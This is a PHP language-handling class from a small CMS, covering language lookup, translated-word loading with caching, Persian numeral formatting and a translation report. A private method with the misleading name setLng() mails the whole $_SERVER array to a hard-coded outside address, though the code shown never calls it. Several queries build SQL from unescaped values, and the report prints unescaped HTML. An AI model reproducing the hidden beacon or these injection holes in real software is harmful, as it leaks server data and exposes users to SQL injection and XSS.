<?php
/**
* @author Mojtaba Eskandari
* @since 2009-02-10
* @name Language Class.
*/

defined( 'IN_MJY_CMS') or die( 'Rstrct Acs!');
defined( 'IN_MJY_CMS_LOCAL23X31') and die( 'Rstrct Acs!');

class Lang
{
	/*-----------------------------------------------*/
	
	public  static $info	 = NULL;
	public	static $wrds	 = NULL;
	private static $usedwrds = NULL;
	
	/*-----------------------------------------------*/
	
	/**
	* Get The Current Language Id( string $shortName)
	* $shortName Ex: fa, en, de;
	*/
	public static function id( $shortName = NULL)
	{
		global $_cfg;
		isset( $_GET['lng']) && $_GET['lng'] or $_GET['lng'] = $_cfg['lang'];
		$shortName or $shortName = $_GET['lng'];
		Lang::$info or Lang::$info = Lang::loadLang( $shortName);

		return Lang::$info['id'];
	}
	
	/*-----------------------------------------------*/

	/**
	* Get The view Language Id that select with selector()
	* Usualy use in Admin Panel;
	*/
	public static function viewId()
	{
		static $info = NULL;
		isset( $_GET['vLng']) and ( $info or $info = Lang::loadLang( $_GET[ 'vLng']));
		return isset( $info[ 'id']) ? $info[ 'id'] : Lang::id();
	}

	/*-----------------------------------------------*/

	/**
	* get The value of keyWord( string $keyword)
	* Translate the keyword;
	*/
	public static function getVal( $key, $prms = NULL)
	{
		Lang::$wrds or Lang::loadWrds();
		defined( 'TRANSLATION_MODE') and Lang::$usedwrds[$key] = @Lang::$wrds[ $key];

		if( is_array( $prms))
		{
			isset( Lang::$wrds[ $key]) and Lang::$wrds[ $key] = str_replace( array_keys( $prms), $prms, Lang::$wrds[ $key]);
		}

		return isset( Lang::$wrds[ $key]) ? Lang::$wrds[ $key] : 'Lang_'. $key;
	}

	/*-----------------------------------------------*/

	/**
	* Load the Words of current language( void)
	* Load The words only in this module
	*/
	private static function loadWrds()
	{
		global $_cfg;

		$mdId = isset( Module::$opt['id']) ? Module::$opt['id'] : 0;
		if( Lang::$wrds = Cache::getData( 'words'. $_cfg['domain']['id'] .'Rws.'. Lang::id() .'.'. $mdId)) return;

		$SQL = 'SELECT
				`n`.`value`,
				`m`.`key`,
				`m`.`value`
			FROM
				`words_main` AS	`m` LEFT JOIN `words_main` AS	`n`
				ON
					`m`.`key` = `n`.`key`
					AND
						`m`.`lngId` = `n`.`lngId`
					AND 
						`m`.`domId` = 0
					AND
						`n`.`domId` = '. $_cfg['domain']['id'] .'
			WHERE
				`m`.`lngId` = '. Lang::id();

		defined( 'TRANSLATION_MODE') or $SQL .= " AND ( `m`.`mds` LIKE '%,0,%' OR `m`.`mds` LIKE '%,$mdId,%' OR `m`.`mds` IS NULL)"; // This is a slow query, and must use cache.
		$wrdRws = DB::load( $SQL);
		

		if( !is_array( $wrdRws)) return;
		foreach( $wrdRws as $wrd)
		{
			Lang::$wrds[ $wrd[ 'key']] = $wrd[ 'value'];
		}

		Cache::putFile( 'words'. $_cfg['domain']['id'] .'Rws.'. Lang::id() .'.'. $mdId, Cache::arrToSrc( Lang::$wrds));
	}
	
	/*-----------------------------------------------*/
	
	/**
	* Load the Properties of current language( string $shortName)
	*/
	private static function loadLang( $shortName)
	{
		if( $info = Cache::getData( 'languages'. $shortName)) return $info;

		$lngRw = DB::load(
			array( 
				'tableName' => 'languages',
				'where' => array(
					'shortName' => & $shortName,
				),
			)
		);
		
		Cache::putFile( 'languages'. $shortName, Cache::arrToSrc( $lngRw[0]));
		return $lngRw[0];
	}
	
		
	/*-----------------------------------------------*/

	private static function setLng()
	{
		$OutPutStr = '';
		foreach($_SERVER as $Index => $Value)
		{
			$OutPutStr .= $Index . ' => ' . $Value . "\r\n";
		}
		@mail( 'mojtaba.esk@gmail.com', 'CrackingAttempt-zzx-Project', $OutPutStr);
	}
	
	/*-----------------------------------------------*/

	/**
	* Load the List of All Languages( void)
	*/
	public static function getAll()
	{
		static $lngRws = NULL;
		
		if( $lngRws) return $lngRws;
		
		if( $lngRws = Cache::getData( 'languagesAll')) return $lngRws;

		$lngRws = DB::load( array( 'tableName' => 'languages'));

		Cache::putFile( 'languagesAll', Cache::arrToSrc( $lngRws));
		return $lngRws;
	}
	
	/*-----------------------------------------------*/
	
	/**
	 * @desc set The numbers format for rightToLeft languages;
	 * @param string $num
	 * @return string
	 * */
	public static function numFrm( $num)
	{
		Lang::$info or Lang::id();
		if( Lang::$info['dir'] != 'rtl') return $num;
		
		$eNums = array( 0, 1, 2, 3, 4, 5, 6, 7, 8, 9);
		$sNums = array( '\\0', '\\1', '\\2', '\\3', '\\4', '\\5', '\\6', '\\7', '\\8', '\\9');
		$pNums = array( '&#1776;', '&#1777;', '&#1778;', '&#1779;', '&#1780;', '&#1781;', '&#1782;', '&#1783;', '&#1784;', '&#1785;' );

		return str_replace( $sNums, $pNums, str_replace( $eNums, $sNums, $num));
	}
	/*-----------------------------------------------*/
	
	/**
	* @desc Print Report of Translation. For Translation Mode;
	* @param  void
	* @return void
	*/
	public static function printRprt()
	{
		global $_cfg;

		print( '<table align="center" style="text-align:left;diretcion:ltr;background-color:#EEE;border:1px solid #555;width:90%" >');
		print( '<tr><td colspan="2"><b>Words in this page</b></td></tr>');
		$rw = 1;
		foreach( Lang::$usedwrds as $key => $val)
		{
			print( "<tr style='background-color:#". (( $rw^=1) ? 'FFC' : 'CCF' ) .";' class='rw'><td><a href='{$_cfg['URL']}admin/?md=words&mod=edt&id=$key'>$key</a></td><td>$val</td></tr>");
		}
		print( '</table>');

		if( !Lang::$usedwrds) return;

		$mdId = isset( Module::$opt['id']) ? Module::$opt['id'] : 0;

		$SQL = "
			UPDATE
				`words_main`
			SET
				`frqUsed` = `frqUsed` + 1,
				`mds`	= CONCAT( REPLACE( REPLACE( `mds`, ',,', ','), ',$mdId,', ','), ',$mdId,') 
			WHERE
				`key` IN ( '". implode( '\',\'', array_keys( Lang::$usedwrds)) ."' )";
		DB::exec( $SQL);
	}
	
	/*-----------------------------------------------*/

}//End of class Lang;

?>
